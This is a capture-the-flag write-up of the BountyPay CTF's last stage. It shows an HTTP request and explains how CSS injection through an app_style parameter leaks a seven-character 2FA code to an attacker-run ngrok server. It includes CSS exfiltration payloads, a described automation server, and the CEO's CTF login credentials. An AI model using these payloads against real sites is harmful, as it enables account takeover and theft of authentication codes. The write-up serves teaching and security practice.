# Final nail in the coffin
- We have the CEO's credentials now. `marten.mickos` & `h&H5wy2Lggj*kKn4OD&Ype`. We login to https://app.bountypay.h1ctf.com/ and we are presented with a login 2FA which we can again bypass with the same way of MD5 hash which we did for Brian's account earlier when we were starting in the CTF.

- The first tweet https://twitter.com/Hacker0x01/status/1266454022124376064 mentioned that the CEO needs to approve May payments, so I straightaway went and selected 05/2020 and got the transaction:

{F851466}

Clicking on the pay button redirects us to yet another 2FA:

{F851468}

Clicking on the Send Challenge button, the request gets sent:

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4156.0 Safari/537.36
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

Notice that there is `app_style` parameter which indicates that the page is including our custom CSS on the page. I verified this by giving a Burp Collaborator URL and it sure did receive a request from a browser with User-Agent: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/81.0.4044.138 HeadlessChrome/81.0.4044.138 Safari/537.36`. Straightaway, this pointed me towards Data Infiltration using CSS. I had read it first on @d0nut's article https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d.

## What is Data Exfiltration using CSS?
- So CSS can't execute arbitrary javascript code in the client side, but doesn't mean that it isn't less dangerous. For starters, if we are able to include our custom CSS, we can leak the URL of the page by using the referer of the page. Also, we can use CSS selectors in such a way that we can extract information about some object character by character.

For example,

We can use the following CSS to check if there exists a input tag with name starting with 'a':

```css
input[name^="a"]{
    background-image: url("https://ourserver/?val=a");
}
```

But checking one by one would be tiresome, so we include a series of such selectors to detect the first character. When the first character is detected, we can move onto another character like this:

```css
input[name^="a"]{
    background-image: url("https://ourserver/?val=a");
}
input[name^="b"]{
    background-image: url("https://ourserver/?val=b");
}
...
input[name^="9"]{
    background-image: url("https://ourserver/?val=9");
}
```

So for solving this, I first tried with the known input names: `challenge_answer`, `challenge`, `challenge_timeout`. Turns out, none of them seemed to exist in the vulnerable page. I verified the existence by the following payload

```css
input[name="challenge_answer"]{
    background-image: url("https://ourserver/challenge_answer_exists");
}
```

I did the same with the other three but didn't receive any callbacks for them.

## Stage 1: Determining the input tag name

I wrote a small hacky python script for generating CSS: {F851483}

`python gen.py > css.css` and it would generate for first character. I would use ngrok to expose the css via Apache from my local computer. Give the ngrok path with css to the `app_style` parameter of the payment 2FA request.

Then once we get first hit in collaborator, we would give it to the script and it would generate payload for the second character and so on.

After a few trial and errors, got the first character `c`:

{F851490}

Doing this way, I got to `code_` and then when I fired the next payload, I got 7 requests, meaning we had 7 name tags: `name_1` to `name_7` which had to be exfiltrated.

## Stage 2: Getting all those values and the flag

We know that it is of 7 characters due to 2 reasons: `<input name="challenge_answer" class="form-control" maxlength="7">` and also due to the fact that `code_1` - `code_7` input tags exist on the vulnerable page.

I tried extracting `name_1` first by using the manual approach. It seemed to be different everytime and also the fact that we had to collect 7 values from tags together and submit the 2FA code within 2 minutes seemed possible although hard to be done manually. Also, why to do a task in 10 minutes if it can be automated in 2 hours? :P

Came to the conclusion that this will be easier to be automated and wrote up a Python server using flask which I exposed using ngrok: 

- Python Script: {F860033}
- Start ngrok by `./ngrok http 5000`
- Start the python script by `python twofactor.py https://ngrok.url` (Only `https` urls seem to work in this CTF)
- Visit http://localhost:5000/start and flag will be displayed. Everything from submitting the request to getting the 2FA token and submitting it back to the application was automated.

We got the flag that is:  `736c635d8842751b8aafa556154eb9f3`. 

- Screenshot:
{F851505}

- Video:
{F851504}

About the script:
- Creates a blank array with 7 elements
- `/start` endpoint/function submits the post request to `https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba` with our ngrok URL (https://ngrok.url/css). This triggers the css url

- `/css` endpoint: This endpoint is called by the vulnerable page. This endpoint returns our auto-generated CSS using the function `getFullCss` and with mime-type `text/css`

It is of the form:

```css
    input[name="code_1"][value^="a"]{
        background-image: url("https://15d95cd78dd6.ngrok.io/exfil?name=code_1&val=a");
    }

...

    input[name="code_7"][value^="_"]{
        background-image: url("https://15d95cd78dd6.ngrok.io/exfil?name=code_7&val=_");
    }
```

It covers all `code_1`-`code_7` 

- `/exfil` endpoint receives callbacks from the CSS. With each callback, it sets the particular value in the array. So for `?name=code_4&val=a`, array's 3rd element would be set to `a`. In this way, when the array is full, we send it along with the challenge_timeout and challenge we received.

This is one of the best automated solutions I have written till now for any CTF!

Takeaways:
- Don't always think too complicated, sometimes it's quite easy and in front of your eyes. Start with simpler stuff and go towards more complex stuff.
- Keep trying and reading stuff and try everything you know, never assume anything.
- Note taking is important as any information you discover might be helpful in the later part.
- Think like a developer.
- But most importantly: **Persistence: Don't give up** - this was the reason I was able to solve this CTF. It was 5 am in the morning on the second day of solving that I was able to solve this.

Regards,
Yash

